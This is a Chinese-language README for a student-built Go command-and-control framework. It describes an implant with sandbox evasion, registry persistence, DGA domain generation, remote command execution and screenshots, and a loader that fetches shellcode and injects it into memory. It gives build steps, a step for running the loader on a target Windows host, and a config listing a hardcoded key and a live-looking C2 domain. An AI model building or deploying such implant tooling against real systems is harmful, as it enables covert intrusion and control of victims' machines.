# BasicC2 - 模块化 C2 框架

## 项目结构

```
BasicC2/
├── cmd/                          # 主程序入口
│   ├── server/                   # C2 服务器
│   │   └── main.go
│   ├── agent/                    # 被控端
│   │   └── main.go
│   └── loader/                   # 加载器
│       └── main.go
├── internal/                     # 内部共享包
│   ├── crypto/                   # 加密模块
│   │   └── aes.go
│   ├── config/                   # 配置管理
│   │   └── config.go
│   └── models/                   # 数据结构
│       └── types.go
├── agent/                        # Agent 特有模块
│   ├── commands/                 # 命令执行
│   │   ├── executor.go
│   │   └── screenshot.go
│   ├── persistence/              # 持久化
│   │   └── install.go
│   ├── evasion/                  # 反沙箱/反检测
│   │   └── sandbox.go
│   └── dga/                      # DGA 域名生成
│       └── dga.go
├── server/                       # Server 特有模块
│   ├── handlers/                 # HTTP 处理器
│   │   └── handlers.go
│   └── storage/                  # 数据存储
│       └── memory.go
├── loader/                       # Loader 特有模块
│   ├── fetch/                    # Payload 下载
│   │   └── downloader.go
│   └── inject/                   # 内存注入
│       └── injector.go
├── web/                          # Web 前端
│   └── index.html
├── go.mod                        # Go 模块定义
├── go.sum                        # 依赖版本锁定
├── Makefile                      # 构建脚本
└── README.md                     # 项目文档
```

## 核心功能

### 1. C2 服务器 (Server)
- ✅ 加密通信 (AES-GCM)
- ✅ 心跳机制与主机管理
- ✅ 命令下发与回显
- ✅ Web 控制台界面
- ✅ RESTful API

### 2. 被控端 (Agent)
- ✅ 反沙箱检测
- ✅ 自动持久化 (注册表)
- ✅ DGA 域名生成
- ✅ 命令执行
- ✅ 屏幕截图
- ✅ 中文编码处理

### 3. 加载器 (Loader)
- ✅ DGA Payload 下载
- ✅ 内存注入执行
- ✅ 无文件落地 (Shellcode)

## 快速开始

### 编译

```bash
# 编译 Server (Linux/macOS)
go build -o server cmd/server/main.go

# 编译 Agent (Windows)
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go

# 编译 Loader (Windows)
GOOS=windows GOARCH=amd64 go build -o loader.exe cmd/loader/main.go

# 或使用 Makefile
make all        # 编译所有组件
make server     # 只编译 Server
make agent      # 只编译 Agent
make loader     # 只编译 Loader
make clean      # 清理编译产物
```

### 运行

1. **启动 Server**
```bash
./server
# 访问 http://localhost:8080 查看 Web 控制台
```

2. **生成 Agent Payload**
```bash
# 先编译 Agent
GOOS=windows GOARCH=amd64 go build -o agent.exe cmd/agent/main.go

# 将 agent.exe 转换为 payload.bin (Shellcode)
# 注意：需要使用 pe2shc 等工具转换
```

3. **运行 Loader**
```bash
# 在目标 Windows 机器上执行
loader.exe
```

## 配置说明

所有配置集中在 [internal/config/config.go](internal/config/config.go)：

```go
// 加密密钥（Server 和 Agent 必须一致）
var AESKey = []byte("HereIsMySecretKey123456789012345")

// C2 服务器地址
const BackupC2URL = "https://api.cailiu666.xyz"

// DGA 种子
const DGASeed = "MySecretSeed2024"
```

## 模块说明

### internal/ - 公共模块
- **crypto**: 提供 AES-GCM 加密/解密函数
- **config**: 全局配置常量
- **models**: 共享的数据结构

### agent/ - Agent 模块
- **commands**: 命令执行器，支持 CMD 命令和截图
- **persistence**: 持久化安装（注册表 + 文件复制）
- **evasion**: 反沙箱检测（CPU 核心数等）
- **dga**: DGA 域名生成与 C2 协商

### server/ - Server 模块
- **handlers**: HTTP 请求处理器
- **storage**: 内存数据库（主机列表、命令队列）

### loader/ - Loader 模块
- **fetch**: Payload 下载器（支持 DGA）
- **inject**: 内存注入与执行

## 扩展新功能

### 添加新的 Agent 命令

1. 在 [agent/commands/](agent/commands/) 创建新文件，例如 `upload.go`
2. 实现命令逻辑
3. 在 [executor.go](agent/commands/executor.go) 的 `Execute()` 函数中添加分支

### 添加新的反检测手段

1. 在 [agent/evasion/](agent/evasion/) 创建新文件，例如 `debugger.go`
2. 实现检测逻辑
3. 在 [cmd/agent/main.go](cmd/agent/main.go) 的 `main()` 函数中调用

### 添加数据库持久化

1. 在 [server/storage/](server/storage/) 创建 `database.go`
2. 实现 SQL/NoSQL 存储接口
3. 修改 [cmd/server/main.go](cmd/server/main.go) 使用新的存储后端

## 技术栈

- **语言**: Go 1.24
- **加密**: AES-GCM (crypto/aes)
- **截图**: github.com/kbinani/screenshot
- **编码**: golang.org/x/text (GBK/UTF-8)
- **系统调用**: golang.org/x/sys/windows

## 安全警告

⚠️ 本项目仅供教育和研究目的使用。请勿用于非法用途。

## 许可证

本项目为课程设计作业，版权归作者所有。
